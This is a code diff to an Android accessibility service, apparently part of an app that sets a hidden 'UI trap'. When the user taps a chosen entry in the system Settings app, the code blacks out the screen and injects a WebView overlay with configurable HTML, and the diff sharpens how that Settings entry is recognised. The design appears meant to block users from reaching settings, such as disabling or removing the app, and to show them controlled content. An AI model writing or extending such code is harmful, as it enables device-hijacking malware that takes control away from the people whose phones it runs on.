@@ -476,30 +476,31 @@ class MyAccessibilityService : AccessibilityService() {
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
             if (statsPrefs.getBoolean("ui_trap_active", false)) {
-                val target = statsPrefs.getString("ui_trap_target", "") ?: ""
-                if (target.isNotEmpty() && nodeMatchesTarget(event.source, target)) {
+                val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
+                val pkg = event.packageName?.toString() ?: ""
+                
+                // FINGERPRINT MATCHING: Check Package + Hierarchy Content
+                if (targetData.isNotEmpty() && verifyStructuralMatch(event.source, pkg, targetData)) {
                     val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
                     val html = statsPrefs.getString("ui_trap_html", "") ?: ""
                     val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
                     
-                    DebugLogger.log("UI_TRAP", "Target clicked: [$target]. Applying INSTANT blackout blindfold.")
+                    DebugLogger.log("UI_TRAP", "Fingerprint matched in $pkg. Deploying blindfold.")
                     
-                    // 1. Instant Blackout (No thread jumping, synchronous execution)
+                    // 1. Instant Blackout
                     DimmerManager.applyDim(this, 100, method)
                     
                     // 2. Deploy WebView Overlay
                     DynamicUIManager.showOverlay(this, true, method, html)
-                    DebugLogger.log("UI_TRAP", "WebView overlay injected. Awaiting JS Cortex.setDim(0) handshake to reveal.")
                     
-                    // 3. Disarm Trap (Single-fire to prevent loops)
+                    // 3. Disarm Trap
                     statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
                     
                     // 4. Timeout Failsafe
                     if (timeout > 0) {
                         Handler(Looper.getMainLooper()).postDelayed({
                             DynamicUIManager.removeOverlay(this)
-                            DimmerManager.applyDim(this, 0, method) // Force unblind
-                            DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Failsafe triggered, blindfold removed.")
+                            DimmerManager.applyDim(this, 0, method)
                         }, timeout * 1000)
                     }
                 }
@@ -624,18 +625,39 @@ class MyAccessibilityService : AccessibilityService() {
         return false
     }
 
-    private fun nodeMatchesTarget(node: AccessibilityNodeInfo?, targetText: String): Boolean {
+    private fun verifyStructuralMatch(node: AccessibilityNodeInfo?, pkg: String, target: String): Boolean {
         if (node == null) return false
-        val nodeText = node.text?.toString()?.trim()
-        val nodeDesc = node.contentDescription?.toString()?.trim()
-        val nodeId = node.viewIdResourceName?.toString()?.trim()
 
-        if (nodeText.equals(targetText, ignoreCase = true)) return true
-        if (nodeDesc.equals(targetText, ignoreCase = true)) return true
-        if (targetText.contains(":id/") && nodeId == targetText) return true
+        // 1. Split target into Title and Summary if user used the @@ separator
+        // Format: "Title Text@@Summary Fragment"
+        val parts = target.split("@@")
+        val titleTarget = parts[0]
+        val summaryTarget = parts.getOrNull(1)
+
+        // 2. Check Package Security (Only trigger in Settings for this specific trap)
+        if (!pkg.contains("com.android.settings")) return false
+
+        // 3. Recursive check for Title and Summary inside the clicked container
+        val hasTitle = findTextInside(node, titleTarget)
+        val hasSummary = if (summaryTarget != null) findTextInside(node, summaryTarget) else true
+
+        if (hasTitle && hasSummary) {
+            DebugLogger.log("TRAP_MATCH", "Fingerprint Verified: Title=[$titleTarget] Summary=[$summaryTarget]")
+            return true
+        }
+
+        return false
+    }
+
+    private fun findTextInside(node: AccessibilityNodeInfo?, text: String): Boolean {
+        if (node == null) return false
+        val nText = node.text?.toString() ?: ""
+        val nDesc = node.contentDescription?.toString() ?: ""
+        
+        if (nText.contains(text, ignoreCase = true) || nDesc.contains(text, ignoreCase = true)) return true
         
         for (i in 0 until node.childCount) {
-            if (nodeMatchesTarget(node.getChild(i), targetText)) return true
+            if (findTextInside(node.getChild(i), text)) return true
         }
         return false
     }
